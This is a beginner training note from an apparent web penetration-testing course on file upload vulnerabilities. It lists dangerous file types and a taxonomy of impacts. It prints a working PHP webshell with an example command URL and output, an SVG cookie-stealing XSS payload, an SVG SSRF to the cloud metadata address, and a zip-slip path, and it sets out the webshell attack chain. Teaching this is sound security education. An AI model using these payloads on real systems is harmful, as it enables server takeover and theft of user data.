---
tags: [vapt, file-upload, beginner]
difficulty: beginner
module: "22 - File Upload"
topic: "22.01 What Makes File Upload Dangerous"
portswigger_labs: ["Remote code execution via web shell upload"]
---

# 22.01 — What Makes File Upload Dangerous

## The Core Risk

```
FILE UPLOAD ALLOWS USERS TO PUSH FILES TO THE SERVER
  
  WORST CASE:
  User uploads: malicious.php
  Server saves to web root: /var/www/html/uploads/malicious.php
  User visits: https://target.com/uploads/malicious.php
  Server EXECUTES the PHP file!
  → REMOTE CODE EXECUTION (RCE)!
  
  This is how webshells work!
  One file upload + one visit = full server compromise!
  
  WHY IT'S DANGEROUS:
  1. File might be EXECUTED (if saved to executable location)
  2. File might HARM other users (XSS via SVG, drive-by download)
  3. File might CONSUME resources (DoS via huge file / billion laughs)
  4. File might ATTACK THE SERVER (SSRF via SVG fetch, XXE in DOCX)
  5. File might OVERWRITE EXISTING FILES
  6. File content might be USED UNSAFELY elsewhere (SQLi in filename)
```

---

## Dangerous File Types

```
SERVER-SIDE EXECUTION:
  .php, .php3, .php4, .php5, .phtml, .phar  ← PHP
  .asp, .aspx, .ashx, .asmx, .axd           ← ASP.NET
  .jsp, .jspx, .war                          ← Java
  .cgi, .pl                                  ← Perl CGI
  .py, .rb                                   ← Python/Ruby (if configured)
  .shtml, .shtm                              ← Server-Side Includes
  
  → If uploaded to web root → server executes them!
  → RCE: run any OS command!

CLIENT-SIDE ATTACKS:
  .svg, .svgz    ← SVG: XML + JavaScript → XSS!
  .html, .htm    ← HTML: JavaScript → XSS!
  .xhtml         ← XHTML: JavaScript → XSS!
  
  → If served with text/html content-type → JavaScript runs in victim's browser!

OTHER SERVER-SIDE ATTACKS:
  .pdf, .docx, .xlsx, .pptx ← XXE (if server parses them server-side)
  .zip, .tar.gz             ← ZIP Slip (path traversal in archive)
  .xml                      ← XXE, SSRF
  .htaccess, .user.ini      ← Configuration override (on Apache)
  
DOS RISKS:
  Very large files (exhaust disk space)
  "Zip bombs" (1KB → 10GB when unzipped)
  "Billion laughs" in XML/SVG
```

---

## Attack Surface Taxonomy

```
IMPACT 1: REMOTE CODE EXECUTION
  Upload PHP/ASP webshell → execute OS commands
  Severity: CRITICAL
  
  WebShell content:
  <?php system($_GET['cmd']); ?>
  
  Access: https://target.com/uploads/shell.php?cmd=whoami

IMPACT 2: STORED XSS VIA FILE
  Upload SVG with JavaScript:
  <svg onload="alert(document.cookie)">
  
  Victim views uploaded file → JavaScript runs in their browser!
  Severity: HIGH (if file served same-origin)

IMPACT 3: SSRF VIA FILE
  Upload SVG that fetches internal resources:
  <svg><image href="http://169.254.169.254/latest/meta-data/"/>
  Server reads SVG → fetches that URL → SSRF!
  Severity: HIGH

IMPACT 4: XXE VIA FILE PARSING
  Upload malicious DOCX → server parses it → XXE triggered!
  Can read server files or SSRF
  Severity: HIGH

IMPACT 5: ZIP SLIP
  Malicious archive: ../../etc/cron.d/backdoor
  Extract → overwrites cron file → code execution!
  Severity: CRITICAL

IMPACT 6: DoS
  Zip bomb: 1MB → 1TB uncompressed
  Server tries to process → disk/memory exhaustion
  Severity: HIGH
```

---

## Where to Find File Upload Functionality

```
COMMON UPLOAD LOCATIONS:
  - Profile picture upload
  - Document upload (invoices, reports, ID verification)
  - Support ticket attachments
  - Image galleries
  - CSV import
  - Blog post images
  - Resume/CV upload
  - Product images (e-commerce)
  - Email attachments (web email)
  - Backup/restore functionality
  
ALSO LOOK FOR INDIRECT UPLOAD:
  - URL-based import: "Import from URL" → server fetches file = SSRF!
  - Paste image from clipboard
  - Cloud storage linking (S3, GDrive → server fetches = SSRF)
  - File generation (export PDF, XLSX → server generates, might parse input)
```

---

## The Webshell Attack Chain

```
GOAL: GET A WEBSHELL WORKING

STEP 1: Find upload functionality
STEP 2: Upload malicious file (various bypass techniques)
STEP 3: Find where the file is stored (URL)
STEP 4: Execute the webshell
STEP 5: Run OS commands

MINIMAL PHP WEBSHELL:
  <?php system($_GET['cmd']); ?>
  
  Save as: shell.php
  Upload to: target.com's profile picture upload
  
  If saved to: /uploads/shell.php
  Visit: https://target.com/uploads/shell.php?cmd=id
  Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
  → RCE CONFIRMED!

FINDING WHERE FILE IS STORED:
  1. Check the response → does it return the file URL?
  2. Check the profile page → right-click profile picture → URL?
  3. Try common paths: /uploads/, /files/, /media/, /static/uploads/
  4. Brute force: feroxbuster on known upload directory
  5. Error messages: 500 error might reveal path
  6. Source code: check HTML for img src, link href pointing to upload dir
```

---

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]] — actual webshell upload
- [[03 - Content-Type Bypass]] — bypassing MIME type validation
- [[04 - Extension Bypass]] — bypassing extension checks
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — fix
